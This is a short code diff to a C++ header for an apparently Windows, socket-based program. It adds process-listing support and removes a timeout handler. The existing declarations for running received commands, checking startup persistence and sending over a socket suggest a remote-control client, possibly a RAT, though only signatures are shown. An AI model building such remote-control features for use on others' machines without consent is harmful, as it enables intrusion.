@@ -57,6 +57,8 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include <tchar.h>
+#include <psapi.h>
 
 #include <sqlite3.h>
 #include <sodium.h>
@@ -123,13 +125,13 @@ private:
     int handleRunCommand(char* command);
     int handleCheckInStartup();
     int handleCutCommand(char* command);
+    int handleGetProcesses();
 
     // Misc functions
     static int shiftStrLeft(char* str, int num);
     int handleSend(std::string sen, SOCKET sock);
     void handleError(const char* command);
     int handleCommand(char* command);
-    void handleTimeout();
     void handleStartupError(int move);
     void handleWrongUsage(const char* command);
 
